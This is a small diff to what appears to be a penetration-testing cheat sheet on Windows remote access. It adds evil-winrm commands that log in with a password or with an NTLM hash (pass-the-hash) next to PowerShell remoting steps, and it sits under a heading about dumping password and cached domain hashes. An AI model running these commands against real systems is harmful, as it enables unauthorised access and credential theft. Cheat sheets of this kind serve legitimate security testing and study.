@@ -204,6 +204,10 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName 172.16.191.10 -Credential $credential
 Enter-PSSession 1(id)
 ```
+```
+evil-winrm -i ip -u username -p password
+evil-winrm -i ip -u username -H ntlm_hash
+```
 
 ###### Dump the local password hash and domain cached hash
 ```
